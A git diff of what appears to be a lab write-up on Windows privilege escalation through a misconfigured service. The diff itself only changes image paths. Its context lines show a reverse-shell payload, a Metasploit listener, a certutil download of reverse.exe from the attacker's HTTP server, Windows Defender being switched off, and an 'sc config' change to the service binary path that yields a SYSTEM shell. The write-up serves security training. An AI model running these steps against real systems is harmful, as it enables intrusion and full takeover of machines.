@@ -104,7 +104,7 @@ Final size of exe file: 7680 bytes
 Saved as: reverse.exe
 ```
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step1-1.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step1-1.png" width="600">
 </p>
 
 ## Step 2 — Setting Up Metasploit Listener and HTTP Server
@@ -127,7 +127,7 @@ run
 [*] Started reverse TCP handler on 192.168.5.128:4444
 ```
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step2-1.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step2-1.png" width="600">
 </p>
 
 Terminal 2 — Python HTTP Server
@@ -142,7 +142,7 @@ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step2-2.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step2-2.png" width="600">
 </p>
 
 ## Step 3 — Downloading the Payload on the Victim Machine
@@ -155,7 +155,7 @@ http://192.168.5.128/
 I clicked reverse.exe to download it. Windows Defender blocked it at first — showing "Couldn't download - Virus detected". I turned off Real Time Protection and Threat Protection in Windows Defender settings, then the download went through successfully.
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step3-1.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step3-1.png" width="600">
 </p>
 
 ## Step 4 — Transferring the Payload to PrivEsc Folder
@@ -177,7 +177,7 @@ certutil -urlcache -split -f http://192.168.5.128/reverse.exe reverse.exe
 CertUtil: -URLCache command completed successfully.
 ```
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step4-1.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step4-1.png" width="600">
 </p>
 
 ## Step 5 — Running the Payload and Getting a Meterpreter Shell
@@ -195,13 +195,14 @@ Metasploit Caught the Connection on Kali
 
 meterpreter >
 ```
+
 - Attacker IP : 192.168.5.128
 - Victim IP : 192.168.5.129
 - Port : 4444
 - Session : Meterpreter session 1 opened
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step5-1.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step5-1.png" width="600">
 </p>
 
 ## Step 6 — Enumerating the Victim and Uploading winPEAS
@@ -233,7 +234,7 @@ Server username: MSEDGEWIN10\user
 I was a normal low privilege user. I needed to get to SYSTEM.
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step6-1.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step6-1.png" width="600">
 </p>
 
 Uploaded winPEAS
@@ -248,7 +249,7 @@ meterpreter > upload /home/kali/Desktop/tools/winPEASany.exe
 [*] Completed  : /home/kali/Desktop/tools/winPEASany.exe -> winPEASany.exe
 ```
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step6-2.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step6-2.png" width="600">
 </p>
 
 ## Step 7 — Running winPEAS to Find Privilege Escalation Paths
@@ -276,7 +277,7 @@ meterpreter > upload /home/kali/Desktop/tools/accesschk.exe
 ```
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step8-1.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step8-1.png" width="600">
 </p>
 
 Checked Service Permissions
@@ -306,7 +307,7 @@ RW daclsvc
 `SERVICE_CHANGE_CONFIG` was the key. It meant I could swap the binary path to my own payload.
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step8-2.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step8-2.png" width="600">
 </p>
 
 ## Step 9 — Checking the Service Configuration
@@ -329,7 +330,7 @@ SERVICE_NAME: daclsvc
 ```
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step9-1.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step9-1.png" width="600">
 </p>
 
 ## Step 10 — Generating a New Payload and Starting a Second Listener
@@ -348,7 +349,7 @@ Saved as: privesc.exe
 ```
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step10-1.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step10-1.png" width="600">
 </p>
 
 Started Second Metasploit Listener on Port 9001
@@ -367,7 +368,7 @@ run
 ```
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step10-2.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step10-2.png" width="600">
 </p>
 
 ## Step 11 — Uploading the New Payload and Changing the Service Binary Path
@@ -387,7 +388,7 @@ meterpreter > upload /home/kali/Desktop/privesc.exe
 ```
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step11-1.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step11-1.png" width="600">
 </p>
 
 Changed the Service Binary Path
@@ -409,7 +410,7 @@ sc config daclsvc binpath= "C:\PrivEsc\privesc.exe"
 ```
 
 <p align="center">
-  <img src="/writeups/Windows-Privilege-Escalation/insecure service configuration/images/step11-2.png" width="600">
+  <img src="/Windows-Privilege-Escalation/insecure service configuration/images/step11-2.png" width="600">
 </p>
 
 ## Step 12 — Starting the Service and Getting a SYSTEM Shell
